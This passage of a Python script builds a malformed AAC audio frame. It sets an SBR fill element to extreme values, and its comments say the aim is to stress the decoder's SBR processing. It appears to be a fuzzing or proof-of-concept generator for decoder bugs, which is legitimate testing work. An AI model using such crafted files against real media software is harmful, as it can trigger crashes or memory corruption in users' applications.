esent(0) + tns_data_present(0) + gain_control_present(0)\n    frame.extend([0x00, 0x00, 0x00])\n    \n    # === Fill Element with SBR (ID_FIL = 110 = 6) ===\n    # ID_FIL (3 bits) + count (4 bits)\n    # count = 15 means extended count follows\n    frame.append(0b11011111)  # 110 (ID_FIL) + 1111 (count=15)\n    \n    # Extended count (8 bits) - actual count = value - 1\n    # Use large count to trigger more SBR processing\n    frame.append(0xFF)  # 255 - 1 = 254 bytes\n    \n    # Extension type (4 bits): EXT_SBR_DATA = 13 (0xD)\n    # bs_header_flag (1 bit): 1 (header present)\n    # bs_amp_res (1 bit): 1\n    # bs_start_freq (4 bits): 1111 (15 - extreme value)\n    frame.append(0b11011111)  # 1101 (EXT_SBR_DATA) + 1 (header) + 111\n    \n    # bs_stop_freq (4 bits): 1111 (15 - extreme)\n    # bs_xover_band (3 bits): 111 (7 - max)\n    # bs_reserved (2 bits): 11\n    frame.append(0b11111111)  # 1111 + 111 + 1\n    \n    # bs_header_extra_1 (1 bit): 1\n    # bs_freq_scale (2 bits): 11\n    # bs_alter_scale (1 bit): 1\n    # bs_noise_bands (2 bits): 11\n    # bs_header_extra_2 (1 bit): 1\n    # bs_limiter_bands (2 bits): 11\n    frame.append(0b11111111)  # 1 + 11 + 1 + 11 + 1 + 1\n    \n    # bs_limiter_gains (2 bits): 11\n    # bs_interpolFreq (1 bit): 1\n    # bs_smoothingMode (1 bit): 1\n    # bs_frame_class (2 bits): 10 (FIXFIX)\n    # bs_num_env (2 bits): 11 (4 envelopes - extreme)\n    frame.append(0b11111011)  # 11 + 1 + 1 + 10 + 11\n    \n    # Add frequency resolution flags for 4 envelopes\n    # bs_freq_res[0-3] (4 bits): 1111\n    # bs_df_env[0-3] (4 bits): 1111\n    frame.append(0b11111111)\n    \n    # bs_df_noise[0-3] (4 bits): 1111\n    # Add more extreme SBR data to stress processing\n    frame.append(0b11110000)\n    \n    # Fill remaining bytes with pattern that stresses SBR processing\n    # Total fill element size should be ~254 bytes as specified\n    remaining = 254 - (len(frame) - 10)  # 10 = header size before fill element\n    \n    # Use alt